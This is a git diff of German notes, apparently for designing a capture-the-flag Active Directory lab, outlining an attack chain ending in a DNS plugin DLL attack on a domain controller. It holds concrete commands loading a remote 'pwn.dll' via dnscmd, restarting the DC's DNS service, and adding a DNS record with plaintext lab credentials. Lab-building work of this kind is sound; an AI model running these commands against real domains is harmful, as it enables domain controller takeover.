@@ -5,7 +5,7 @@
 4. HTTP Relay von SRV02 zu ldap://DC01
 5. ShadowCredentials um an SRV02$ zu kommen
 6. Mit SRV02$ local admin mit s4u2self magic
-7. DNS attack auf DC01 um shell zu bekommen (maybe über                                                m,             )
+7. DNS attack auf DC01 um shell zu bekommen (maybe über schtasks)
 
 ## DNS Exploit setup
 1. DNS Service auf SRV02 installieren, damit dnscmd.exe da ist
@@ -24,4 +24,8 @@ Registry key where DLL is loaded:
  * Load DLL: `dnscmd.exe /config /serverlevelplugindll \\192.168.56.11\public\pwn.dll`
  * Stop DNS Service: `sc.exe \\DC01 stop dns`
  * Start DNS Service: `sc.exe \\DC01 start dns`
- * Add DNS entry: `python dnstool.py -u hack.lu\\aOkDJZSHwH -p 'W8tjSid{_NedM#D' ldaps://192.168.108.134 -port 636 -a add -r kali --data 192.168.108.128 -dns-ip 192.168.108.134`
+ * Add DNS entry: `python dnstool.py -u hack.lu\\ta_bort.mig -p 'LjtLNg37LdcZin73' ldaps://192.168.108.134 -port 636 -a add -r kali --data 192.168.108.128 -dns-ip 192.168.108.134`
+
+## TODOs
+
+* Beschreibung von low priv user auf Schwedisch verfassen
